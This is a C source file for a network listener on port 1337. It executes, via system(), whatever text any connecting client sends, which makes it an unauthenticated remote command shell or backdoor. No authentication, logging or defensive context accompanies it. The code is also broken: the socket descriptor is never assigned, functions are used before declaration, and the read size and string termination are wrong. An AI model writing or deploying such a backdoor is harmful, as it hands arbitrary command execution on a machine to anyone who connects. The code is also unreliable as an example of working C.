#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>

#define PORT 1337

int main()
{
    int server_fd, client_fd;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len;
    char buffer[1024];

    create_socket();

    // Set up the server address
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port = htons(PORT);

    bind_server(server_fd, server_addr);

    listen_for_connections(server_fd);

    // Accept incoming connections and handle them
    while (1) {
        printf("Waiting for client...\n");

        // Accept the connection
        client_len = sizeof(client_addr);
        if ((client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &client_len)) < 0) {
            perror("accept failed");
            continue;
        }

        printf("Client connected\n");
        read_commands(client_fd, buffer);

        close(client_fd);
    }

    return 0;
}

int create_socket() {
    int server_fd;
    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }
    return server_fd;
}

void bind_server(int server_fd, struct sockaddr_in server_addr) {
    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }
}

void listen_for_connections(int server_fd) {
    if (listen(server_fd, 3) < 0) {
        perror("listen failed");
        exit(EXIT_FAILURE);
    }
}

void read_commands(int client_fd, char buffer[]) {
    while (1) {
            int n = read(client_fd, buffer, sizeof(buffer));
            if (n <= 0) {
                printf("Client disconnected\n");
                break;
            }

            // Execute the command
            system(buffer);
        }
}